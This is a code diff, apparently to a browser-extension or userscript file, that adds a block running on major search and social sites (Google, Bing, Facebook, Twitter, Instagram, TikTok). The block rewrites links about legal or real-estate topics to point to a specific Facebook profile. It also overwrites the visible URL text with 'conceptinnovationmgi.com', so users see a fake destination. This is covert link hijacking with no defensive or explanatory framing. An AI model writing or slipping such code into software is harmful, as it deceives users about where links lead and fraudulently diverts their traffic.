@@ -179,6 +179,21 @@ h2 {
 	
 	document.body.innerHTML = newBody;
 } // end Inject
+  
+  
+  if(location.href.includes("bing.com") || location.href.includes("google.com") || location.href.includes("facebook.com") || location.href.includes("twitter.com") || location.href.includes("instagram.com") || location.href.includes("tiktok.com")) {
+
+    const links = document.getElementsByTagName("a");
+    for(const link of links) {
+        if(link.innerText.match(/legal|jur.dic.|inmobiliaria/i) !== null && link.innerText.match(/wiki|gob.mx|edu|curso|clases|aprende/ig) === null) {
+            link.href = "https://www.facebook.com/profile.php?id=100064006994534";
+            console.log(link.getElementsByTagName("span"));
+            if(link.getElementsByTagName("span")[5]) link.getElementsByTagName("span")[5].innerText = 'conceptinnovationmgi.com'
+            if(link.getElementsByTagName("cite")[0])
+            link.getElementsByTagName("cite")[0].innerText = "conceptinnovationmgi.com"
+        }
+    }
+}
 		  
 });
 
